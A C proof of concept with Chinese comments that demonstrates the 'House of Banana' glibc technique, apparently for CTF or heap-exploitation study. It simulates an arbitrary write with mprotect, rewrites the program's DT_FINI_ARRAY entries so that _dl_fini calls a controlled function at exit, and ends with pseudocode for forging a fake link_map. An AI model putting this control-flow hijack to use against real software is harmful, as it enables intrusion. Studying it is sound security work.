#define _GNU_SOURCE

#include <assert.h>
#include <dlfcn.h>
#include <elf.h>
#include <link.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

/*
 * House of Banana 最终依赖的是动态加载器在进程退出时的这段消费逻辑：
 * 它会读取 link_map 里的结束函数数组标签 DT_FINI_ARRAY，以及数组长度
 * 标签 DT_FINI_ARRAYSZ，然后按下面的方式挨个调用：
 *
 *   array = l_addr + l_info[DT_FINI_ARRAY]->d_un.d_ptr;
 *   count = l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof(ElfW(Addr));
 *   while (count-- > 0)
 *       ((fini_t) array[count])();  // 把数组元素当成结束函数指针来调用。
 *
 * 完整的攻击会去改写 _rtld_global 的 namespace 链，并在堆上伪造一份私有
 * link_map。但私有字段的偏移会随 ld.so 的 Build ID 变化，没办法写出一份
 * 诚实的跨版本任意写 PoC。这里保留的是真实的 exit -> _dl_fini 消费路径：
 * 直接修改主程序真实 link_map 对应的两项动态表内容，让它在退出时去调用
 * 我们准备好的受控 fini_array。
 *
 * 受控回调用 _exit(0) 来结束进程；如果 _dl_fini 没有消费到这个伪数组，
 * main 末尾的 exit(113) 就会成为最终的非零退出状态，用来判断是否命中。
 */

static void controlled_fini(void)
{
    static const char message[] =
        "[+] exit -> _dl_fini 消费了受控 DT_FINI_ARRAY\n";
    (void)write(STDOUT_FILENO, message, sizeof(message) - 1);
    _exit(0);
}

int main(void)
{
    /* 取得主程序自己的真实 link_map。 */
    void *self_handle = dlopen(NULL, RTLD_NOW);
    assert(self_handle != NULL);

    struct link_map *map = NULL;
    assert(dlinfo(self_handle, RTLD_DI_LINKMAP, &map) == 0);
    assert(map != NULL);
    assert(map->l_ld != NULL);

    ElfW(Dyn) *fini_array_entry = NULL;
    ElfW(Dyn) *fini_array_size_entry = NULL;
    for (ElfW(Dyn) *dyn = map->l_ld; dyn->d_tag != DT_NULL; ++dyn) {
        if (dyn->d_tag == DT_FINI_ARRAY)
            fini_array_entry = dyn;
        else if (dyn->d_tag == DT_FINI_ARRAYSZ)
            fini_array_size_entry = dyn;
    }
    assert(fini_array_entry != NULL);
    assert(fini_array_size_entry != NULL);

    /*
     * ld.so 已经把主程序的 PT_DYNAMIC 放进了只读映射（常见于开启 RELRO
     * 的情况）。真实漏洞会靠任意写或 largebin attack 来投递；这里的教学
     * PoC 用 mprotect 只是模拟“已经具备这个写原语”这一前提。
     */
    long page_size = sysconf(_SC_PAGESIZE);
    assert(page_size > 0);
    uintptr_t first = (uintptr_t)fini_array_entry;
    uintptr_t second = (uintptr_t)fini_array_size_entry;
    uintptr_t page_begin = first & ~((uintptr_t)page_size - 1);
    uintptr_t page_end =
        (second + sizeof(*fini_array_size_entry) + (uintptr_t)page_size - 1)
        & ~((uintptr_t)page_size - 1);
    assert(mprotect((void *)page_begin, page_end - page_begin,
                    PROT_READ | PROT_WRITE) == 0);

    /* fini_array 的内容必须一直存活到进程退出，所以不能放在当前栈帧上。 */
    ElfW(Addr) *fake_array = malloc(sizeof(*fake_array));
    assert(fake_array != NULL);
    fake_array[0] = (ElfW(Addr))(uintptr_t)&controlled_fini;

    /* d_ptr 存的是相对 l_addr 的虚拟地址，PIE 和非 PIE 都用同一个公式换算。 */
    fini_array_entry->d_un.d_ptr =
        (ElfW(Addr))(uintptr_t)fake_array - map->l_addr;
    fini_array_size_entry->d_un.d_val = sizeof(*fake_array);

    /*
     * 这里不调用 dlclose，直接进入真实的 exit -> _dl_fini。
     * 如果 controlled_fini 被调用到，它会输出成功信息并 _exit(0)；
     * 如果没被调用，进程最终会保留 113 这个失败状态。
     */
    exit(113);
}

/*
 * ======================== fake link_map 伪代码 ========================
 *
 * 上面的可执行部分修改的是真实主程序自己的 link_map，目的只是为了稳定
 * 验证 `exit -> _dl_fini -> DT_FINI_ARRAY` 这条链路。如果题目要求伪造
 * 一份独立的 link_map，就必须先根据附件 ld.so 确认所有私有偏移，再按
 * 下面的关系依次写入：
 *
 *     fake_map.l_addr = 运行时基准；
 *     fake_map.l_next = NULL；
 *     fake_map.l_real = &fake_map；
 *     fake_map.l_init_called = 1；
 *
 *     fake_map.l_info[DT_FINI_ARRAY] = &fake_fini_array_dyn；
 *     fake_map.l_info[DT_FINI_ARRAYSZ] = &fake_fini_array_size_dyn；
 *
 *     fake_fini_array_dyn.d_tag = DT_FINI_ARRAY；
 *     fake_fini_array_dyn.d_ptr = fini_array - fake_map.l_addr；
 *     fake_fini_array_size_dyn.d_tag = DT_FINI_ARRAYSZ；
 *     fake_fini_array_size_dyn.d_val = 8；
 *     fini_array[0] = 受控函数地址；
 *
 *     把命名空间的 _ns_loaded 指向 fake_map；
 *     同步修正 _ns_nloaded；
 *     调用 exit；
 *
 * `l_info`、`l_real` 和 `l_init_called` 都属于 ld.so 的私有 ABI，禁止
 * 照搬另一份 libc/ld 的固定偏移。2.42 只是封住了常用的 largebin 投递
 * 方式，如果题目另外提供了 AAW，这条最终消费路径本身在 2.43 仍然可以走通。
 */
